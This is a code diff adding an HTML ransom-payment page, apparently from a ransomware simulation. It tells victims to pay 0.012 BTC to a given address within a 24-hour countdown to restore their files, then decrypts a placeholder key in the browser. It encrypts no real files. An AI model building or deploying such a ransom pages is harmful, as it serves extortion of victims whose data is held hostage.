@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bitcoin Payment</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Complete Your Bitcoin Payment</h1>
+        <p>To restore your files, send the required Bitcoin amount to the address below:</p>
+        <div class="bitcoin-address">12bYDPgwueZ9NyMgw51gp7AA8isjr6SMw</div>
+
+        <p>Or scan the QR code to pay:</p>
+        <div class="qr-code">
+            <img src="https://api.qrserver.com/v1/create-qr-code/?data=12bYDPgwueZ9NyMgw51gp7AA8isjr6SMw&size=150x150" alt="Bitcoin QR Code">
+        </div>
+
+        <p>Amount to send: <strong>0.012 BTC</strong></p>
+        <p>Please complete your payment before the deadline below:</p>
+        <div class="timer" id="payment-timer">Time left: Loading...</div>
+        <button id="payBtn">Pay</button>
+    </div>
+
+    <script>
+        // Countdown Timer Function
+        function countdownTimer(endTime) {
+            const timerInterval = setInterval(function() {
+                const now = new Date().getTime();
+                const distance = new Date(endTime).getTime() - now;
+
+                if (distance < 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('payment-timer').innerHTML = "Payment completed";
+                    alert("Time expired! Please try again."); 
+                } else {
+                    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                    document.getElementById('payment-timer').innerHTML = `Time left: ${days}d ${hours}h ${minutes}m ${seconds}s`;
+                }
+            }, 1000);
+        }
+
+        // RSA Encryption/Decryption Logic
+        let publicKey, privateKey, encryptedDecryptionKey;
+
+        async function generateRSAKeys() {
+            const keyPair = await window.crypto.subtle.generateKey(
+                {
+                    name: "RSA-OAEP",
+                    modulusLength: 2048,
+                    publicExponent: new Uint8Array([1, 0, 1]),
+                    hash: { name: "SHA-256" },
+                },
+                true,
+                ["encrypt", "decrypt"]
+            );
+
+            publicKey = keyPair.publicKey;
+            privateKey = keyPair.privateKey;
+
+            // Encrypt a mock decryption key
+            const decryptionKey = "YOUR_DECRYPTION_KEY_HERE"; // Replace with an actual key if needed
+            const encoder = new TextEncoder();
+            const encodedKey = encoder.encode(decryptionKey);
+
+            encryptedDecryptionKey = await window.crypto.subtle.encrypt(
+                { name: "RSA-OAEP" },
+                publicKey,
+                encodedKey
+            );
+        }
+
+        async function decryptDecryptionKey() {
+            const decrypted = await window.crypto.subtle.decrypt(
+                { name: "RSA-OAEP" },
+                privateKey,
+                encryptedDecryptionKey
+            );
+
+            const decoder = new TextDecoder();
+            return decoder.decode(decrypted);
+        }
+
+        // Event Listener for Pay Button
+        const payBtn = document.getElementById("payBtn");
+
+        // Redirect to decryption page after pressing "Pay"
+        payBtn.onclick = async function() {
+            const decryptionKey = await decryptDecryptionKey();
+            localStorage.setItem("decryptionKey", decryptionKey);
+            window.location.href = 'decryption.html';
+        };
+
+        // Initialize timer and RSA keys
+        countdownTimer(new Date().getTime() + (24 * 60 * 60 * 1000));
+        generateRSAKeys();
+    </script>
+</body>
+</html>
